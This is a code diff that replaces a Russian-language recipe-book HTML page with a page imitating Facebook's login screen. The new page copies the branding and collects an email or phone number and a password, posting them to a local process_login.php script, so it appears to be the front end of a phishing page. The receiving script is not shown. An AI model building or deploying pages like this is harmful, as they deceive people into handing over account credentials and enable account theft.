@@ -3,94 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Книга рецептов</title>
+    <title>Facebook Login</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f8f8f8;
-            margin: 20px;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background: #f3f3f3;
+        }
+
+        .container {
+            width: 360px;
+            margin: 120px auto;
+            background: #fff;
+            border: 1px solid #ddd;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
 
         h1 {
-            color: #333;
             text-align: center;
+            margin-bottom: 20px;
+            color: #3366cc;
         }
 
-        h2 {
-            color: #555;
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        label {
+            margin-bottom: 5px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            padding: 10px;
+            border: 1px solid #ddd;
+            margin-bottom: 10px;
+        }
+
+        input[type="submit"] {
+            padding: 10px 20px;
+            background: #3366cc;
+            border: none;
+            color: #fff;
+            cursor: pointer;
         }
 
         a {
-            color: #007bff;
-            text-decoration: none;
-        }
-
-        a:hover {
-            text-decoration: underline;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-bottom: 20px;
-        }
-
-        th, td {
-            border: 1px solid #ddd;
-            padding: 8px;
-            text-align: left;
-        }
-
-        th {
-            background-color: #f2f2f2;
-        }
-
-        ol, ul {
-            margin-bottom: 20px;
-        }
-
-        footer {
             text-align: center;
-            color: #777;
-            margin-top: 20px;
+            display: block;
+            margin-top: 10px;
+            text-decoration: none;
+            color: #3366cc;
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <h1>Facebook</h1>
+        <form action="process_login.php" method="post">
+            <label for="email">Email address or phone number</label>
+            <input type="text" id="email" name="email" required>
 
-    <h1>Книга рецептов</h1>
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
 
-    <h2 id="recipe1">Рецепт 1: Паста карбонара</h2>
-    <a href="#recipe1">Перейти к рецепту</a>
-
-    <table>
-        <tr>
-            <th>Ингредиент</th>
-            <th>Количество</th>
-        </tr>
-        <tr>
-            <td>Спагетти</td>
-            <td>200 г</td>
-        </tr>
-        <tr>
-            <td>Бекон</td>
-            <td>150 г</td>
-        </tr>
-        <!-- Добавьте другие ингредиенты -->
-    </table>
-
-    <p><strong>Шаги:</strong></p>
-    <ol>
-        <li>Сварите спагетти по инструкции на упаковке.</li>
-        <li>Обжарьте бекон на сковороде до золотистой корки.</li>
-        <!-- Добавьте другие шаги -->
-    </ol>
-
-    <!-- Добавьте другие рецепты с аналогичной структурой -->
-
-    <footer>
-        Создано с любовью. © 2024
-    </footer>
-
+            <input type="submit" value="Log In">
+        </form>
+        <a href="#">Forgotten account?</a>
+        <a href="#">Create new account</a>
+    </div>
 </body>
 </html>
